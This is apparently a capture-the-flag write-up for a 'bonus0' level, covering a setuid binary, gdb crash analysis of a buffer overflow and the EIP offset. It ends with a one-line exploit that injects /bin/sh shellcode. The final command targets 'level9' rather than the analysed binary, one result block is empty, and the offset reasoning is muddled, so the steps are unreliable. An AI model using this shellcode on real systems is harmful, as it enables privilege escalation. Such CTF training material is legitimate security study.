# Bonus0

## 1. Context

```bash
$ id
uid=2010(bonus0) gid=2010(bonus0) groups=2010(bonus0),100(users)

$ pwd
/home/user/bonus0

$ ls -la
[...]
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
[...]
```

## 2. Program behavior

```bash
$ ./bonus0
 - 
0123456789
 - 
BBBBBBBBBB
0123456789 BBBBBBBBBB

 
```

Asks for 2 inputs and then prints them.

## 3. Code overview

After analyze it with gdb we can find three interesting functions : `main()`, `pp()` and `p()`.
`main` creates a buffer, then calls the function `pp()` then `puts()`.


## 4. Exploit

Let's run it with gdb.

Let's try with a huge input :
```bash
(gdb) ./bonus0
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
-
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
-
AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���

Program received signal SIGSEGV, Segmentation fault.
0x64636363 in ?? ()

(gdb) info registers
[...]
eip            0x64636363       0x64636363
[...]
```

0x63 = c => offset = 8

We found the pattern in EIP (44434343 -> cccd), start at the second c. The offset of c is 8, + 1 because it's the second. The offset of EIP start at 9.

Running our program with gdb, we get :
```bash

```

## 5. Getting the flag

```bash
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
```

End of simulation
